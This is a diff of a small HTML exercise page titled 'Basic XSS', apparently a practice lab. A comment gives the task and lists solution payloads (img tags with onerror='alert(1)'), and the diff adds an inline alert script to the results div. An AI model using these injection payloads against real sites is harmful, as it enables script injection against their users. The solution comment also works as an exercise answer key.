@@ -1,16 +1,18 @@
+<!DOCTYPE html>
+
 <!-- TASK: is to execute an alert(-100) on the target machine -->
 
-<!-- Solution(s): 
+<!--
+    Solution(s): 
 
-     passing any of these as data input
-     
-     <img src="image.gif" onerror="alert(1)">
-     <img src="" onerror="alert(1)">
-     <img src onerror="alert(1)">
+    passing any of these as data input
+    
+    <img src="image.gif" onerror="alert(1)">
+    <img src="" onerror="alert(1)">
+    <img src onerror="alert(1)">
 
-     -->
+    -->
 
-     <!DOCTYPE html>
 <html lang="en">
   <head>
     <title>Basic XSS</title>
@@ -23,7 +25,11 @@
       <input type="submit" value="Submit">
     </form>
 
-    <div id="results"></div>
+    <div id="results">
+
+      <script>alert(1)</script>
+
+    </div>
 
     <script>
       const resultsTag = document.getElementById('results');
